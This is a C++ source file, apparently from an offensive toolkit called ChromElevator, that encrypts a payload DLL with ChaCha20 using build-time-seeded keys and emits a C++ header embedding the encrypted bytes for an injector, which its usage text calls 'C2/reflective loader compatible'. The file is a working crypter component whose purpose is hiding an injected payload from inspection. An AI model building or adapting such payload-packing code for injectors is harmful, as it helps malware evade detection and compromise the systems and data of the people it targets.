#include "../crypto/crypto.hpp"
#include "../crypto/key_derivation.hpp"
#include <iostream>
#include <fstream>
#include <vector>
#include <iomanip>

/**
 * Payload Encryptor Tool
 *
 * This tool encrypts the payload DLL using runtime-derived keys and generates
 * an embeddable C++ header for direct inclusion in the injector.
 *
 * The key derivation uses the same algorithm as the decryptor,
 * ensuring deterministic keys per build (based on __DATE__/__TIME__).
 *
 * IMPORTANT: The encryptor and injector MUST be built in the SAME
 * compilation session (same make.bat run) for keys to match.
 * This is because BUILD_SEED changes with __DATE__ and __TIME__.
 */

void PrintKeyInfo(const Crypto::RuntimeKeyProvider::KeyMaterial& km) {
    std::cout << "\n=== Runtime Key Derivation Info ===" << std::endl;
    std::cout << "Build Seed: 0x" << std::hex << std::setfill('0')
              << std::setw(16) << Crypto::Detail::BUILD_SEED << std::endl;

    std::cout << "Derived Key: ";
    for (size_t i = 0; i < km.key.size(); ++i) {
        std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)km.key[i];
    }
    std::cout << std::endl;

    std::cout << "Derived Nonce: ";
    for (size_t i = 0; i < km.nonce.size(); ++i) {
        std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)km.nonce[i];
    }
    std::cout << std::endl;
    std::cout << "==================================\n" << std::endl;
}

bool WriteEmbeddedHeader(const std::string& path, const std::vector<uint8_t>& data) {
    std::ofstream out(path);
    if (!out) return false;

    out << "// Auto-generated by ChromElevator encryptor - DO NOT EDIT\n";
    out << "// Generated: " << __DATE__ << " " << __TIME__ << "\n";
    out << "// Payload size: " << std::dec << data.size() << " bytes\n";
    out << "#pragma once\n\n";
    out << "#include <cstdint>\n";
    out << "#include <cstddef>\n\n";
    out << "namespace Payload {\n";
    out << "namespace Embedded {\n\n";
    out << "    alignas(16) inline constexpr uint8_t Data[] = {";

    for (size_t i = 0; i < data.size(); ++i) {
        if (i % 16 == 0) out << "\n        ";
        out << "0x" << std::hex << std::setw(2) << std::setfill('0')
            << static_cast<int>(data[i]);
        if (i < data.size() - 1) out << ",";
        if (i % 16 != 15 && i < data.size() - 1) out << " ";
    }

    out << "\n    };\n\n";
    out << "    inline constexpr size_t Size = sizeof(Data);\n\n";
    out << "} // namespace Embedded\n";
    out << "} // namespace Payload\n";

    return out.good();
}

int main(int argc, char* argv[]) {
    if (argc < 3 || argc > 4) {
        std::cerr << "ChromElevator Payload Encryptor" << std::endl;
        std::cerr << "================================" << std::endl;
        std::cerr << "Usage: " << argv[0] << " <input.dll> <output.enc> [output.hpp]" << std::endl;
        std::cerr << std::endl;
        std::cerr << "This tool encrypts the payload DLL using ChaCha20 with keys" << std::endl;
        std::cerr << "derived from environmental entropy + compile-time seed." << std::endl;
        std::cerr << std::endl;
        std::cerr << "If output.hpp is specified, generates an embeddable C++ header" << std::endl;
        std::cerr << "for direct inclusion (C2/reflective loader compatible)." << std::endl;
        std::cerr << std::endl;
        std::cerr << "NOTE: Encryptor and injector must be built together!" << std::endl;
        return 1;
    }

    std::ifstream in(argv[1], std::ios::binary);
    if (!in) {
        std::cerr << "[-] Failed to open input: " << argv[1] << std::endl;
        return 1;
    }

    std::vector<uint8_t> data((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
    in.close();

    std::cout << "[*] Input file: " << argv[1] << " (" << data.size() << " bytes)" << std::endl;

    // Derive keys using the same algorithm as the decryptor
    auto keyMaterial = Crypto::RuntimeKeyProvider::GetPayloadKey();
    if (!keyMaterial.valid) {
        std::cerr << "[-] Failed to derive encryption keys!" << std::endl;
        return 1;
    }

    PrintKeyInfo(keyMaterial);

    // Encrypt using ChaCha20 (XOR-based, so same function encrypts/decrypts)
    Crypto::ChaCha20::Crypt(keyMaterial.key.data(), keyMaterial.nonce.data(), data, 0);

    // Securely clear key material
    SecureZeroMemory(keyMaterial.key.data(), keyMaterial.key.size());
    SecureZeroMemory(keyMaterial.nonce.data(), keyMaterial.nonce.size());

    std::ofstream out(argv[2], std::ios::binary);
    if (!out) {
        std::cerr << "[-] Failed to open output: " << argv[2] << std::endl;
        return 1;
    }

    out.write(reinterpret_cast<const char*>(data.data()), data.size());
    out.close();

    std::cout << "[+] Encrypted payload written to: " << argv[2] << std::endl;
    std::cout << "[+] Output size: " << std::dec << data.size() << " bytes" << std::endl;

    // Generate embedded header if path provided
    if (argc == 4) {
        if (WriteEmbeddedHeader(argv[3], data)) {
            std::cout << "[+] Embedded header written to: " << argv[3] << std::endl;
        } else {
            std::cerr << "[-] Failed to write embedded header: " << argv[3] << std::endl;
            return 1;
        }
    }

    std::cout << std::endl;
    std::cout << "[!] Remember: Injector must be compiled in same build session!" << std::endl;

    return 0;
}
